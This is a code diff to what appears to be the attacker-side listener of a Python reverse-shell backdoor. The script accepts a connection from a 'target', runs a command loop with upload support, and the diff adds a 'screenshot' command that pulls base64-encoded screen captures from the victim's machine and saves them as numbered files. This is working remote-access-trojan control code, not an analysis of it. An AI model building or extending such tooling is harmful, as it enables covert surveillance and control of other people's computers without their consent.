@@ -37,6 +37,15 @@ def shell():
             except:
                 failed = "Failed to upload"
                 reliable_send(base64.b64encode(failed))
+        elif command[:10] == "screenshot":
+            with open("screenshot%d" % count, "wb") as screen:
+                image = reliable_recv()
+                image_decoded = base64.b64decode(image)
+                if  image_decoded[:4] == "[!!]":
+                    print(image_decoded)
+                else:
+                    screen.write(image_decoded)
+                    count += 1
         else:
             result = reliable_recv()
             print(result)
@@ -54,6 +63,8 @@ def server():
     target, ip = s.accept()
     print("[+] Connection established From: %s" % str(ip))
 
+
+count = 1
 server()
 shell()
 s.close()
